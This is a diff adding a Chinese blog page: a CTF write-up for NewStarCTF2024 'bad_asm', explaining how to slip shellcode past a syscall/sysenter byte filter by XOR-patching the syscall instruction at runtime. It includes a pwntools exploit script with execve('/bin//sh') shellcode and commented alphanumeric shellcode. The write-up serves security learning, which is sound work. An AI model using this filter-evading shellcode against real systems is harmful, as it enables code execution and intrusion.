@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>禁用syscall的shellcode | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">禁用syscall的shellcode</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十月 8, 2024&nbsp;&nbsp;18:28:46</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>遇到一个挺有意思的shellcode题，在此记录一下</p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目来源 NewStarCTF2024 bad_asm</p>
+<p><img src="/../image/%E7%A6%81%E7%94%A8syscall%E7%9A%84shellcode/1.png" alt="1"></p>
+<p>题目中有两个限制</p>
+<ol>
+<li>shellcode通过read读入，意味着如果出现<code>\x00</code>则后续的shellcode都不会被读入</li>
+<li>判断shellcode中是否出现<code>\x0f\x05</code>和<code>\x0f\x34</code>意味着禁用了syscall和sysenter</li>
+</ol>
+<p><img src="/../image/%E7%A6%81%E7%94%A8syscall%E7%9A%84shellcode/2.png" alt="2"></p>
+<p>执行shellcode之前会把除了rdi，rsi以外的寄存器清零</p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>如果直接shellcraft不仅会出现<code>\x00</code>而且会有syscall导致特判不通过</p>
+<p>写出不含有<code>\x00</code>的shellcode很容易，问题在于如何绕过syscall检查</p>
+<p>之后想到了可见字符shellcode，可见字符不含有<code>\x0f</code>可以通过特判，但可见字符的shellcode用到了大量的内存寻址，而寄存器都归0导致要逐步恢复寄存器才可以去寻址，太麻烦了因此这个方法也pass掉</p>
+<p>这题灵感也是来源于可见字符shellcode，可见字符shellcode是利用了大量的异或运算，把输入进去的可见字符异或成不可见字符构造shellcode，因此只需要在最后syscall的时候输入进被异或的字节，绕过特判后在调用shellcode的时候再异或回来即可</p>
+<p>由于rdi指向的是shellcode，因此根据rdi寻址找到syscall被异或的位置即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,0x6</span><br><span class="line">xor [rdi+0x26],rax</span><br></pre></td></tr></table></figure>
+
+<p>这里syscall我写成<code>\x0f\x03</code>最后把0x3与0x6进行异或运算成为0x5,之后就可以正常执行了</p>
+<p>用al也是为了避免出现<code>\x00</code></p>
+<p>本体还有个坑，就是rbp和rsp被清零，导致push和pop不能用，因此在执行shellcode之前想办法分配rbp和rsp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rsi</span><br><span class="line">add rsp,0x50</span><br><span class="line">add rsp,0x50</span><br></pre></td></tr></table></figure>
+
+<p>rsi指向的是一块可写的区域，把rsi的值赋给栈顶并开辟0xa0大小的栈空间，此处直接<code>add rsp,0xa0</code>会出现’\x00’</p>
+<p>后续就正常执行即可</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/mrbw/Desktop/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./asm&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./asm&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.48.123&#x27;, 28643)</span></span><br><span class="line">s   = <span class="keyword">lambda</span> content : r.send(content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content : r.sendline(content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> content,send : r.sendafter(content, send)</span><br><span class="line">sla = <span class="keyword">lambda</span> content,send : r.sendlineafter(content, send)</span><br><span class="line">rc  = <span class="keyword">lambda</span> number : r.recv(number)</span><br><span class="line">ru  = <span class="keyword">lambda</span> content : r.recvuntil(content)</span><br><span class="line">ru(<span class="string">&quot;Input your Code : \n&quot;</span>)</span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b exec&#x27;</span>)</span><br><span class="line">payload=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp,rsi</span></span><br><span class="line"><span class="string">add rsp,0x50</span></span><br><span class="line"><span class="string">add rsp,0x50</span></span><br><span class="line"><span class="string">mov al,0x6</span></span><br><span class="line"><span class="string">xor [rdi+0x26],rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#payload+=b&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA&quot;</span></span><br><span class="line"><span class="comment">#payload+=b&quot;PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx&quot;</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x03&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目中虽说禁用了int 80，但是if里没有禁用<code>\xcd\x50</code>，不知是否可以retfq转化成32位执行shellcode，理论上没问题</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/shellcode/"># shellcode</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/09/16/unsafe-unlink/">unsafe unlink</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
